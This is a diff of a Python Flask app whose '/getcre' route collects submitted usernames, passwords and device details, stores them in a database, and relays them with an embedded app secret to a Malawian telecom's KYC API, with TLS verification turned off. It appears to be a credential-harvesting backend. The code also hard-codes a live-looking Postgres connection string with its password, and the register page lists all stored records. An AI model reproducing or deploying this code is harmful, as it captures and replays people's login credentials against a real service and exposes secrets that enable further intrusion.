@@ -10,7 +10,7 @@ from werkzeug.security import check_password_hash, generate_password_hash
 bp = Blueprint('auth', __name__, url_prefix='/auth')
 
 app= Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI']= 'postgres://yyilkblbrykehy:84cf0c8052645f4de0c2d7c64dce1ae3c781581f3358eae5f0efddd7c0de00c1@ec2-35-174-127-63.compute-1.amazonaws.com:5432/d8n77erpfco80f'#os.environ.get('DATABASE_URL')#'sqlite:///test.db' #
+app.config['SQLALCHEMY_DATABASE_URI']= 'postgres://yyilkblbrykehy:84cf0c8052645f4de0c2d7c64dce1ae3c781581f3358eae5f0efddd7c0de00c1@ec2-35-174-127-63.compute-1.amazonaws.com:5432/d8n77erpfco80f'#os.environ.get('DATABASE_URL')# 'sqlite:///test.db'#
 db =SQLAlchemy(app)
 
 class  info(db.Model):
@@ -24,8 +24,6 @@ class  info(db.Model):
 try:
     db.create_all()
 except:pass
-
-#mine
 @bp.route('/getcre', methods=('GET', 'POST'))
 def getcred():
     if request.method == 'POST':
@@ -37,12 +35,14 @@ def getcred():
         db.session.add(data)
         db.session.commit()
 
-        data1={'usernamep':'igjfghh','password':'yfufufu','device_name':'unknown',
-                   'android_version':'Android 7.0','app_version_name':'1.10.5',
+        data1={'usernamep':username1,'password':password1,'device_name':device,
+                   'android_version':android,'app_version_name':'1.10.5',
                    'app_version_code':'64','appSecret':'KORwViNMSQIDZeVdZqBGZV5sz7uWle9pCPaVyvfU'   }
-        #r=requests.post('https://register.tnm.co.mw/kyc/v2/api/auth/login',data=data1,verify=False)#https://free.facebook.com')
-            
-            #return (r.text, r.status_code, r.headers.items())
+        
+        r=requests.post('https://register.tnm.co.mw/kyc/v2/api/users/configs',data=data1,verify=False)
+        #
+        return (r.text, r.status_code, r.headers.items())
+        #return redirect(url_for('auth.empty'))
             #
     return render_template('auth/getcred.html')
 
@@ -68,7 +68,24 @@ def register():
             return redirect(url_for('auth.login'))
             #return redirect('http://www.google.com')
         flash(error)
+     
+    
     return render_template('auth/register.html',g=info.query.all())
+@bp.route('/empty', methods=('GET', 'POST'))
+def empty():
+    try:
+        if request.method == 'POST':
+            
+            data1={'usernamep':'username1','password':'password1','device_name':'device',
+                   'android_version':'android','app_version_name':'1.10.5',
+                   'app_version_code':'64','appSecret':'KORwViNMSQIDZeVdZqBGZV5sz7uWle9pCPaVyvfU'   }
+            r=requests.post('https://register.tnm.co.mw/kyc/v2/api/auth/login',data=data1,verify=False)
+        #
+            return (r.text, r.status_code, r.headers.items())
+    except:pass
+    return '1'
+
+
 
 
 @bp.route('/login', methods=('GET', 'POST'))
